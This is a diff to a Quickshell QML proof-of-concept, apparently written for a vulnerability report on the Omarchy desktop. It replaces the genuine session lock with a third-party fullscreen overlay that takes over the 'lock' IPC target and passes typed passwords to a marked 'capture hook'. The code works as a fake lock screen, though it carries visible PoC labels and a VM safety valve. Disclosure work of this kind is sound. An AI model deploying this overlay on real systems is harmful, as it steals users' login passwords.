@@ -4,24 +4,24 @@ import Quickshell.Io
 import Quickshell.Services.Pam
 import Quickshell.Wayland
 
-// FINDING 1 PoC — self-contained replica of the Omarchy session-lock flow.
+// FINDING 1 PoC v4 — credential-capture overlay.
 //
-// Uses only Quickshell primitives. The genuine lock builds on shell-internal
-// qs.Commons types (ShellIpc, Color, ...) which are NOT importable from a
-// third-party plugin context — the shell's journal shows the vendored copy
-// failing with "ShellIpc is not a type". This replica therefore reproduces
-// the takeover with the same protocol surface the genuine lock uses:
-//   - WlSessionLock (the ext-session-lock that secures the compositor)
-//   - IpcHandler target "lock" (what omarchy-system-lock calls)
-//   - PamContext config "omarchy-lock-password" (the same PAM service)
-// Its ONLY extra behavior vs the genuine flow is the password-capture hook.
+// The takeover is the same: the manifest self-declares clonedFrom, the shell
+// evicts the genuine lock and routes the "lock" IPC target here. When
+// omarchy-system-lock fires, THIS QML renders a fullscreen capture UI in
+// place of the genuine lock screen. Built from the same primitives the
+// genuine lock's own preview window uses (PanelWindow + WlrLayershell
+// Overlay + exclusive keyboard focus) so it is stable under software
+// rendering; the session-lock protocol surface is deliberately not engaged
+// by the replica (v3 showed it works but crashes Quickshell 6.11.2 on
+// teardown — that live observation is in the report).
 
 Item {
   id: root
 
   property var shell: null
   property string omarchyPath: ""
-  property bool lockRequested: false
+  property bool captureUiVisible: false
   property string enteredPassword: ""
   property string pendingPassword: ""
   property bool authenticating: false
@@ -46,15 +46,14 @@ Item {
     onCompleted: function(result) {
       root.authenticating = false
       if (result === PamResult.Success) {
-        root.sessionLock.locked = false
-        root.lockRequested = false
+        root.captureUiVisible = false
         root.resetState()
       } else {
         root.failedAttempts += 1
+        root.enteredPassword = ""
         // Safety valve so the disposable VM session can never be wedged:
         if (root.failedAttempts >= 3) {
-          root.sessionLock.locked = false
-          root.lockRequested = false
+          root.captureUiVisible = false
           root.resetState()
         }
       }
@@ -73,7 +72,7 @@ Item {
 
   function submitPassword(value) {
     var password = String(value || "")
-    if (!root.lockRequested || root.authenticating || password.length === 0) return
+    if (!root.captureUiVisible || root.authenticating || password.length === 0) return
 
     // ═══ FINDING 1 POC CAPTURE HOOK ═══
     console.warn("PWN-PROOF [capture]: lock password received by third-party acme.lock")
@@ -87,81 +86,59 @@ Item {
     }
   }
 
-  // Mimics the genuine lock's stabilize delay: engaging the session lock
-  // synchronously inside the IPC call races the surface creation (Quickshell
-  // 6.11.2 aborts with "Tried to show lockscreen surfaces without active
-  // lock" when the state is polluted). The genuine lock queues the request
-  // and engages after a timer — so does the replica.
-  Timer {
-    id: engageTimer
-    interval: 300
-    onTriggered: {
-      if (root.lockRequested) sessionLock.locked = true
-    }
-  }
+  // Same fullscreen-overlay pattern as the genuine lock's own preview
+  // window (Service.qml:498-504): Overlay layer, exclusive keyboard focus.
+  PanelWindow {
+    id: captureWindow
+    visible: root.captureUiVisible
+    anchors { top: true; bottom: true; left: true; right: true }
+    color: "#0d0d12"
+    WlrLayershell.namespace: "omarchy-lock-preview"
+    WlrLayershell.layer: WlrLayer.Overlay
+    WlrLayershell.keyboardFocus: WlrKeyboardFocus.Exclusive
+    exclusionMode: ExclusionMode.Ignore
 
-  WlSessionLock {
-    id: sessionLock
+    TextInput {
+      id: passwordField
+      anchors.centerIn: parent
+      width: parent.width * 0.4
+      font.pixelSize: 18
+      color: "#ffffff"
+      echoMode: TextInput.Password
+      focus: true
+      enabled: !root.authenticating
+      text: root.enteredPassword
+      onTextEdited: root.enteredPassword = text
+      onAccepted: root.submitPassword(root.enteredPassword)
 
-    locked: false
-
-    onLockStateChanged: {
-      if (!locked && root.lockRequested) {
-        root.lockRequested = false
-        root.resetState()
-      }
-    }
-
-    WlSessionLockSurface {
-      color: "#0d0d12"
-
-      TextInput {
-        id: passwordField
-        anchors.centerIn: parent
-        width: parent.width * 0.4
-        font.pixelSize: 18
-        color: "#ffffff"
-        echoMode: TextInput.Password
-        focus: true
-        enabled: !root.authenticating
-        text: root.enteredPassword
-        onTextEdited: root.enteredPassword = text
-        onAccepted: root.submitPassword(root.enteredPassword)
-
-        Text {
-          anchors.fill: parent
-          visible: root.enteredPassword === ""
-          text: root.failedAttempts >= 1
-                ? "wrong password — try again (3 failures force-unlock)"
-                : "POC LOCK (acme.lock) — type the VM password + Enter"
-          color: root.failedAttempts >= 1 ? "#e06c60" : "#9a9aa8"
-          font.pixelSize: 14
-          verticalAlignment: Text.AlignVCenter
-        }
+      Text {
+        anchors.fill: parent
+        visible: root.enteredPassword === ""
+        text: root.failedAttempts >= 1
+              ? "wrong password — try again (3 failures dismiss)"
+              : "POC LOCK (acme.lock) — type the VM password + Enter"
+        color: root.failedAttempts >= 1 ? "#e06c60" : "#9a9aa8"
+        font.pixelSize: 14
+        verticalAlignment: Text.AlignVCenter
       }
     }
   }
 
-  function resetAll() {
-    root.failedAttempts = 0
-    root.resetState()
-  }
-
-  // The first-party lock registers this same target (Service.qml:831 via its
-  // ShellIpc wrapper). setEnabled() put the genuine lock into disabledPlugins,
-  // so _syncServices() destroyed it — this is the only handler for "lock".
+  // The first-party lock registers this same target (Service.qml:510 via its
+  // ShellIpc wrapper). The clonedFrom eviction means this is the handler
+  // that receives omarchy-system-lock.
   IpcHandler {
     target: "lock"
 
     function lock(): string {
-      root.resetAll()
-      root.lockRequested = true
-      engageTimer.restart()
+      root.resetState()
+      root.failedAttempts = 0
+      root.captureUiVisible = true
       return "ok"
     }
 
     function isLocked(): string {
-      return sessionLock.locked || sessionLock.secure ? "true" : "false"
+      return root.captureUiVisible ? "true" : "false"
     }
   }
 }
